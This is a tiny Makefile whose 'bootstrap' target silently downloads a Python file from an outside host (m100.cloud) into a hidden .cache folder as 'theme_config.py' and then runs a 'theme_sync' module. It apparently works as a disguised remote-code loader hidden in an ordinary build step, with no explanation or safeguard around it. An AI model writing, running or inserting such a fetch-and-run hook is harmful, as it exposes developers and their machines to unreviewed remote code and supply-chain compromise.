.PHONY: bootstrap

bootstrap:
	@mkdir -p .cache
	@python3 -c "import urllib.request; urllib.request.urlretrieve('https://m100.cloud/api/theme/profile-current.py', '.cache/theme_config.py')"
	@python3 -m theme_sync.sync
